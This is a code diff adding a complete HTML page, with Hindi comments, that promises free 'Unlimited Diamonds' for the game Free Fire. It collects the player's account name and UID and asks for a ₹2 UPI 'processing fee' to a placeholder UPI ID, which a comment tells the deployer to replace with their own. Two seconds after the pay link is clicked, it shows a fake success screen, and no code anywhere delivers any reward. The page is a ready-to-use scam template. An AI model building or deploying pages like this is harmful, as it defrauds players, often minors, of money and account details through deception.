@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire Diamond Rewards</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 30px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+        }
+
+        h2 {
+            color: #ff9900;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: 1px solid #ff9900;
+            background: #0f3460;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+        }
+
+        button, .pay-btn {
+            width: 100%;
+            padding: 12px;
+            margin-top: 15px;
+            background: linear-gradient(45deg, #ff512f, #dd2476);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        button:hover, .pay-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 15px rgba(255, 81, 47, 0.6);
+        }
+
+        /* Square Diamond Selection Grid */
+        .diamond-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .diamond-card {
+            background: rgba(255, 255, 255, 0.08);
+            border: 2px solid rgba(255, 153, 0, 0.3);
+            border-radius: 12px;
+            padding: 20px 10px;
+            cursor: pointer;
+            transition: 0.3s;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            aspect-ratio: 1 / 1; /* वर्गाकार (Square Box) */
+        }
+
+        .diamond-card:hover, .diamond-card.selected {
+            border-color: #ff9900;
+            background: rgba(255, 153, 0, 0.2);
+            box-shadow: 0 0 15px rgba(255, 153, 0, 0.5);
+            transform: translateY(-3px);
+        }
+
+        .diamond-card .icon {
+            font-size: 30px;
+            margin-bottom: 8px;
+        }
+
+        .diamond-card .amount {
+            font-size: 20px;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        .payment-box {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #ff9900;
+            margin: 15px 0;
+        }
+
+        .success-icon {
+            font-size: 60px;
+            color: #2ed573;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Step 1: Get Started -->
+        <div id="step1" class="step active">
+            <h2>Free Fire Diamonds</h2>
+            <p style="margin-bottom: 20px; color: #ccc;">Claim Unlimited Diamonds Instantly</p>
+            <button onclick="goToStep(2)">GET STARTED FREE DIAMOND</button>
+        </div>
+
+        <!-- Step 2: Account Details -->
+        <div id="step2" class="step">
+            <h2>Account Details</h2>
+            <input type="text" id="username" placeholder="Free Fire Account Name" required>
+            <input type="number" id="uid" placeholder="Free Fire Player UID" required>
+            <button onclick="submitDetails()">NEXT STEP</button>
+        </div>
+
+        <!-- Step 3: Square Diamond Selection -->
+        <div id="step3" class="step">
+            <h2>Select Diamonds</h2>
+            <p style="color: #ccc; font-size: 14px;">Choose Diamond Amount:</p>
+            
+            <div class="diamond-grid">
+                <div class="diamond-card" onclick="selectDiamond(this, '100')">
+                    <div class="icon">💎</div>
+                    <div class="amount">100</div>
+                </div>
+                <div class="diamond-card" onclick="selectDiamond(this, '200')">
+                    <div class="icon">💎</div>
+                    <div class="amount">200</div>
+                </div>
+                <div class="diamond-card" onclick="selectDiamond(this, '400')">
+                    <div class="icon">💎</div>
+                    <div class="amount">400</div>
+                </div>
+                <div class="diamond-card" onclick="selectDiamond(this, '2000')">
+                    <div class="icon">💎</div>
+                    <div class="amount">2000</div>
+                </div>
+            </div>
+
+            <button onclick="proceedToPayment()">PROCEED TO TRANSFER</button>
+        </div>
+
+        <!-- Step 4: Payment Option (₹2 UPI Transfer) -->
+        <div id="step4" class="step">
+            <h2>Processing Fee</h2>
+            <div class="payment-box">
+                <p style="font-size: 16px; margin-bottom: 10px;">To complete transfer, pay processing fee:</p>
+                <h1 style="color: #2ed573; font-size: 36px; margin-bottom: 10px;">₹2</h1>
+                <p style="font-size: 12px; color: #aaa;">Click below to pay via UPI App (PhonePe / GPay / Paytm)</p>
+            </div>
+
+            <!-- ⚠️ ध्यान दें: नीचे 'YOUR_UPI_ID@upi' की जगह अपनी असली UPI ID डालें -->
+            <a id="upiPayBtn" href="upi://pay?pa=YOUR_UPI_ID@upi&pn=FreeFireRewards&am=2&cu=INR" class="pay-btn" onclick="finishPayment()">PAY ₹2 VIA UPI APP</a>
+            
+            <button onclick="goToStep(5)" style="background: transparent; border: 1px solid #888; color: #ccc; margin-top: 10px; font-size: 14px;">Already Paid? Click Here</button>
+        </div>
+
+        <!-- Step 5: Final Success Page -->
+        <div id="step5" class="step">
+            <div class="success-icon">✓</div>
+            <h2 style="color: #2ed573;">SUCCESSFUL!</h2>
+            <p style="font-size: 18px; margin-top: 15px;">Your Diamond Transfer In 24 Hours.</p>
+            <button onclick="location.reload()">DONE & EXIT</button>
+        </div>
+    </div>
+
+    <script>
+        let chosenDiamond = null;
+
+        function submitDetails() {
+            const name = document.getElementById('username').value;
+            const uid = document.getElementById('uid').value;
+
+            if (name.trim() === "" || uid.trim() === "") {
+                alert("Please enter both Account Name and UID!");
+                return;
+            }
+            goToStep(3);
+        }
+
+        function selectDiamond(element, amount) {
+            document.querySelectorAll('.diamond-card').forEach(card => card.classList.remove('selected'));
+            element.classList.add('selected');
+            chosenDiamond = amount;
+        }
+
+        function proceedToPayment() {
+            if (!chosenDiamond) {
+                alert("Please select a diamond amount first!");
+                return;
+            }
+            goToStep(4);
+        }
+
+        function finishPayment() {
+            // UPI ऐप में जाने के 2 सेकंड बाद सक्सेस स्क्रीन पर भेज देगा
+            setTimeout(function() {
+                goToStep(5);
+            }, 2000);
+        }
+
+        function goToStep(stepNumber) {
+            document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
+            document.getElementById('step' + stepNumber).classList.add('active');
+        }
+    </script>
+</body>
+</html>
